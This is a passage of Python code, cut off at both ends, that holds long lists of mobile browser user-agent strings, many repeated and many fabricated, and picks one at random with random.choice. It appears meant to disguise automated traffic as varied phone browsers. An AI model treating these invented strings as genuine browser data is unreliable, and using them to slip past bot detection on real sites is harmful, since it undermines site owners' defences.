AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.2727.363 UCBrowser/19.10.0.3613 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; J120FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.1840.369 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; N930P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.2195.130 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; CPH2013 Build/Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.2463.55 UCBrowser/13.7.0.895 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; CPH1827 Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.6370.307 UCBrowser/1.1.0.570 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2371 Build/X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.3951.294 UCBrowser/4.7.0.3001 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4201.41 Mobile Safari/537.36']

ua = random.choice(['Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3089.274 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3089.274 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 22011119TI Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3864.261 UCBrowser/1.1.0.4034 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3089.274 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 22011119TI Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3864.261 UCBrowser/1.1.0.4034 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; M2102K1AC Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.1096.198 UCBrowser/2.5.0.1541 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.369.183 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; GT-S7898I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4719.74 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; GT-C3322i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4884.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; GT-19505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4724.50 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; CPH1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.5530.40 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; M2101K9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3907.285 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; CPH1831) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3089.274 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 22011119TI Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3864.261 UCBrowser/1.1.0.4034 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; M2102K1AC Build/C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.1096.198 UCBrowser/2.5.0.1541 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7; GT-S5253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4029.107 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8; GT-S5292) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4630.70 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.743.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.6367.172 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; X650D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.5299.291 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8; 2112123AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.3990.328 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2621.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1176.139 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4; M2006C3LII Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.4098.231 UCBrowser/9.10.0.209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; A207F) AppleWebKit/537.36 (KHTML, like Gecko) 